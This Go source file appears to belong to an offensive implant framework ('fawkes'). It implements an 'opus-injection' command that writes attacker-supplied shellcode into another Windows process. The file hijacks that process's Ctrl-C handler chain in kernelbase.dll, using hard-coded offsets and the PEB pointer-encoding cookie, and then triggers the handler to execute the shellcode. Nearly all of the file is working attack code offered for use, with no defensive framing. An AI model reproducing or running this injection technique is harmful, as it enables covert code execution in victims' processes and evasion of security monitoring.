//go:build windows
// +build windows

// Package commands provides the opus-injection command for novel callback-based process injection.
//
// Opus Injection explores Windows callback mechanisms that haven't been commonly weaponized.
// These techniques manipulate function pointer structures to achieve code execution through
// legitimate Windows API triggers.
//
// Currently supported variants:
//   - Variant 1: Ctrl-C Handler Chain Injection (console processes)
//
// Future variants planned:
//   - Variant 2: WNF (Windows Notification Facility) Callback Injection
//   - Variant 3: FLS (Fiber Local Storage) Callback Injection
package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"runtime"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// Opus-specific constants
const (
	// Console control events
	CTRL_C_EVENT        = 0
	CTRL_BREAK_EVENT    = 1
	CTRL_CLOSE_EVENT    = 2
	CTRL_LOGOFF_EVENT   = 5
	CTRL_SHUTDOWN_EVENT = 6
)

// Handler list offsets in kernelbase.dll (Windows 10/11)
// These were determined through reversing with WinDbg
const (
	// RVA offsets from kernelbase.dll base
	HandlerListRVA                = 0x399490 // Pointer to heap-allocated array of encoded handler pointers
	HandlerListLengthRVA          = 0x39CBB0 // DWORD: current number of handlers
	AllocatedHandlerListLengthRVA = 0x39CBB4 // DWORD: allocated array capacity
)

// PEB offset for pointer encoding cookie (x64)
const PEB_COOKIE_OFFSET = 0x78

var (
	ntdllOpus                       = windows.NewLazySystemDLL("ntdll.dll")
	procAttachConsole               = kernel32.NewProc("AttachConsole")
	procFreeConsole                 = kernel32.NewProc("FreeConsole")
	procGenerateConsoleCtrlEvent    = kernel32.NewProc("GenerateConsoleCtrlEvent")
	procNtQueryInformationProcessOp = ntdllOpus.NewProc("NtQueryInformationProcess")
)

// PROCESS_BASIC_INFORMATION for getting PEB address
type PROCESS_BASIC_INFORMATION struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 int32
	_                            [4]byte // padding on x64
	UniqueProcessId              uintptr
	InheritedFromUniqueProcessId uintptr
}

const ProcessBasicInformation = 0

// OpusInjectionCommand implements the opus-injection command
type OpusInjectionCommand struct{}

// Name returns the command name
func (c *OpusInjectionCommand) Name() string {
	return "opus-injection"
}

// Description returns the command description
func (c *OpusInjectionCommand) Description() string {
	return "Perform novel callback-based process injection using unexplored Windows mechanisms"
}

// OpusInjectionParams represents the parameters for opus-injection
type OpusInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
	Variant      int    `json:"variant"`
}

// Execute executes the opus-injection command
func (c *OpusInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	var params OpusInjectionParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.ShellcodeB64 == "" {
		return structs.CommandResult{
			Output:    "Error: No shellcode data provided",
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID <= 0 {
		return structs.CommandResult{
			Output:    "Error: Invalid PID specified",
			Status:    "error",
			Completed: true,
		}
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if len(shellcode) == 0 {
		return structs.CommandResult{
			Output:    "Error: Shellcode data is empty",
			Status:    "error",
			Completed: true,
		}
	}

	var output string
	switch params.Variant {
	case 1:
		output, err = executeOpusVariant1(shellcode, uint32(params.PID))
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: Unsupported variant %d. Currently supported: 1 (Ctrl-C Handler)", params.Variant),
			Status:    "error",
			Completed: true,
		}
	}

	if err != nil {
		return structs.CommandResult{
			Output:    output + fmt.Sprintf("\n[!] Injection failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

// executeOpusVariant1 implements Ctrl-C Handler Chain Injection
func executeOpusVariant1(shellcode []byte, pid uint32) (string, error) {
	var output string
	output += "[*] Opus Injection Variant 1: Ctrl-C Handler Chain Injection\n"
	output += "[*] Target: Console processes only\n"
	output += fmt.Sprintf("[*] Shellcode size: %d bytes\n", len(shellcode))
	output += fmt.Sprintf("[*] Target PID: %d\n", pid)

	// Step 1: Open target process
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_VM_READ|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_OPERATION|
			windows.PROCESS_QUERY_INFORMATION,
		false,
		pid,
	)
	if err != nil {
		return output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	output += fmt.Sprintf("[+] Opened target process handle: 0x%X\n", hProcess)

	// Step 2: Find kernelbase.dll in target process
	kernelbaseAddr, err := findModuleInProcess(hProcess, "kernelbase.dll")
	if err != nil {
		return output, fmt.Errorf("failed to find kernelbase.dll: %v", err)
	}
	output += fmt.Sprintf("[+] Found kernelbase.dll at: 0x%X\n", kernelbaseAddr)

	// Step 3: Calculate addresses using known RVA offsets
	handlerListPtrAddr := kernelbaseAddr + HandlerListRVA
	handlerListLengthAddr := kernelbaseAddr + HandlerListLengthRVA
	allocatedLengthAddr := kernelbaseAddr + AllocatedHandlerListLengthRVA

	output += fmt.Sprintf("[+] HandlerList pointer at: 0x%X\n", handlerListPtrAddr)

	// Step 4: Read current handler array pointer
	var handlerArrayAddr uintptr
	err = readProcessMemoryPtr(hProcess, handlerListPtrAddr, &handlerArrayAddr)
	if err != nil {
		return output, fmt.Errorf("failed to read HandlerList pointer: %v", err)
	}
	output += fmt.Sprintf("[+] Handler array at: 0x%X\n", handlerArrayAddr)

	// Step 5: Read current handler count and capacity
	var handlerCount uint32
	var allocatedCount uint32
	err = readProcessMemoryDword(hProcess, handlerListLengthAddr, &handlerCount)
	if err != nil {
		return output, fmt.Errorf("failed to read HandlerListLength: %v", err)
	}
	err = readProcessMemoryDword(hProcess, allocatedLengthAddr, &allocatedCount)
	if err != nil {
		return output, fmt.Errorf("failed to read AllocatedHandlerListLength: %v", err)
	}
	output += fmt.Sprintf("[+] Current handlers: %d, Capacity: %d\n", handlerCount, allocatedCount)

	if handlerCount >= allocatedCount {
		return output, fmt.Errorf("handler array is full (%d/%d) - cannot inject without reallocation", handlerCount, allocatedCount)
	}

	// Step 6: Get target process PEB to read pointer encoding cookie
	pebAddr, err := getProcessPEB(hProcess)
	if err != nil {
		return output, fmt.Errorf("failed to get PEB address: %v", err)
	}
	output += fmt.Sprintf("[+] Target PEB at: 0x%X\n", pebAddr)

	// Step 7: Read pointer encoding cookie from PEB+0x78
	var pointerCookie uintptr
	err = readProcessMemoryPtr(hProcess, pebAddr+PEB_COOKIE_OFFSET, &pointerCookie)
	if err != nil {
		return output, fmt.Errorf("failed to read pointer cookie: %v", err)
	}
	output += fmt.Sprintf("[+] Pointer encoding cookie: 0x%X\n", pointerCookie)

	// Step 8: Allocate memory for shellcode
	// Use kernel32 proc calls (defined in vanillainjection.go)
	shellcodeAddr, _, allocErr := procVirtualAllocEx.Call(
		uintptr(hProcess),
		0,
		uintptr(len(shellcode)),
		uintptr(MEM_COMMIT|MEM_RESERVE),
		uintptr(PAGE_EXECUTE_READWRITE),
	)
	if shellcodeAddr == 0 {
		return output, fmt.Errorf("VirtualAllocEx for shellcode failed: %v", allocErr)
	}
	output += fmt.Sprintf("[+] Allocated shellcode memory at: 0x%X\n", shellcodeAddr)

	// Step 9: Write shellcode
	var bytesWritten uintptr
	ret, _, writeErr := procWriteProcessMemory.Call(
		uintptr(hProcess),
		shellcodeAddr,
		uintptr(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
		uintptr(unsafe.Pointer(&bytesWritten)),
	)
	if ret == 0 {
		return output, fmt.Errorf("WriteProcessMemory for shellcode failed: %v", writeErr)
	}
	output += fmt.Sprintf("[+] Wrote %d bytes of shellcode\n", bytesWritten)

	// Step 10: Encode shellcode address using the target's pointer cookie
	// RtlEncodePointer simply XORs with the cookie
	encodedShellcodeAddr := shellcodeAddr ^ pointerCookie
	output += fmt.Sprintf("[+] Encoded shellcode address: 0x%X\n", encodedShellcodeAddr)

	// Step 11: Write encoded pointer to handler array at index [handlerCount]
	targetSlot := handlerArrayAddr + uintptr(handlerCount)*8
	err = writeProcessMemoryPtr(hProcess, targetSlot, encodedShellcodeAddr)
	if err != nil {
		return output, fmt.Errorf("failed to write handler to array: %v", err)
	}
	output += fmt.Sprintf("[+] Wrote encoded handler to slot %d (0x%X)\n", handlerCount, targetSlot)

	// Step 12: Increment HandlerListLength
	newCount := handlerCount + 1
	err = writeProcessMemoryDword(hProcess, handlerListLengthAddr, newCount)
	if err != nil {
		return output, fmt.Errorf("failed to update HandlerListLength: %v", err)
	}
	output += fmt.Sprintf("[+] Updated HandlerListLength: %d -> %d\n", handlerCount, newCount)

	// Step 13: Detach from our console (if any) and attach to target
	procFreeConsole.Call()

	ret, _, attachErr := procAttachConsole.Call(uintptr(pid))
	if ret == 0 {
		// Try to restore original handler count before failing
		writeProcessMemoryDword(hProcess, handlerListLengthAddr, handlerCount)
		return output, fmt.Errorf("AttachConsole failed: %v (target may not be a console process)", attachErr)
	}
	output += "[+] Attached to target console\n"

	// Step 14: Generate Ctrl+C event
	ret, _, ctrlErr := procGenerateConsoleCtrlEvent.Call(
		uintptr(CTRL_C_EVENT),
		0, // Send to all processes in console group
	)
	if ret == 0 {
		output += fmt.Sprintf("[!] GenerateConsoleCtrlEvent warning: %v\n", ctrlErr)
	} else {
		output += "[+] Generated CTRL_C_EVENT\n"
	}

	// Detach from target console
	procFreeConsole.Call()

	output += "[+] Opus Injection Variant 1 completed\n"
	output += "[*] Note: Shellcode executed as Ctrl handler callback\n"

	return output, nil
}

// findModuleInProcess finds a module's base address in a remote process
func findModuleInProcess(hProcess windows.Handle, moduleName string) (uintptr, error) {
	// Use EnumProcessModulesEx to find the module
	var modules [1024]windows.Handle
	var needed uint32

	err := windows.EnumProcessModulesEx(hProcess, &modules[0], uint32(len(modules)*int(unsafe.Sizeof(modules[0]))), &needed, windows.LIST_MODULES_ALL)
	if err != nil {
		return 0, err
	}

	numModules := needed / uint32(unsafe.Sizeof(modules[0]))

	for i := uint32(0); i < numModules; i++ {
		var modName [windows.MAX_PATH]uint16
		err := windows.GetModuleBaseName(hProcess, modules[i], &modName[0], windows.MAX_PATH)
		if err != nil {
			continue
		}

		name := windows.UTF16ToString(modName[:])
		if stringsEqualFold(name, moduleName) {
			return uintptr(modules[i]), nil
		}
	}

	return 0, fmt.Errorf("module %s not found", moduleName)
}

// stringsEqualFold compares strings case-insensitively
func stringsEqualFold(a, b string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := 0; i < len(a); i++ {
		ca, cb := a[i], b[i]
		if ca >= 'A' && ca <= 'Z' {
			ca += 32
		}
		if cb >= 'A' && cb <= 'Z' {
			cb += 32
		}
		if ca != cb {
			return false
		}
	}
	return true
}

// getProcessPEB retrieves the PEB address of a remote process
func getProcessPEB(hProcess windows.Handle) (uintptr, error) {
	var pbi PROCESS_BASIC_INFORMATION
	var returnLength uint32

	status, _, _ := procNtQueryInformationProcessOp.Call(
		uintptr(hProcess),
		uintptr(ProcessBasicInformation),
		uintptr(unsafe.Pointer(&pbi)),
		uintptr(unsafe.Sizeof(pbi)),
		uintptr(unsafe.Pointer(&returnLength)),
	)

	if status != 0 {
		return 0, fmt.Errorf("NtQueryInformationProcess failed: 0x%X", status)
	}

	return pbi.PebBaseAddress, nil
}

// readProcessMemoryPtr reads a pointer-sized value from remote process
func readProcessMemoryPtr(hProcess windows.Handle, addr uintptr, value *uintptr) error {
	var bytesRead uintptr
	buf := make([]byte, 8)
	err := windows.ReadProcessMemory(hProcess, addr, &buf[0], 8, &bytesRead)
	if err != nil {
		return err
	}
	*value = *(*uintptr)(unsafe.Pointer(&buf[0]))
	return nil
}

// readProcessMemoryDword reads a DWORD value from remote process
func readProcessMemoryDword(hProcess windows.Handle, addr uintptr, value *uint32) error {
	var bytesRead uintptr
	buf := make([]byte, 4)
	err := windows.ReadProcessMemory(hProcess, addr, &buf[0], 4, &bytesRead)
	if err != nil {
		return err
	}
	*value = *(*uint32)(unsafe.Pointer(&buf[0]))
	return nil
}

// writeProcessMemoryPtr writes a pointer-sized value to remote process
func writeProcessMemoryPtr(hProcess windows.Handle, addr uintptr, value uintptr) error {
	var bytesWritten uintptr
	buf := (*[8]byte)(unsafe.Pointer(&value))[:]
	return windows.WriteProcessMemory(hProcess, addr, &buf[0], 8, &bytesWritten)
}

// writeProcessMemoryDword writes a DWORD value to remote process
func writeProcessMemoryDword(hProcess windows.Handle, addr uintptr, value uint32) error {
	var bytesWritten uintptr
	buf := (*[4]byte)(unsafe.Pointer(&value))[:]
	return windows.WriteProcessMemory(hProcess, addr, &buf[0], 4, &bytesWritten)
}
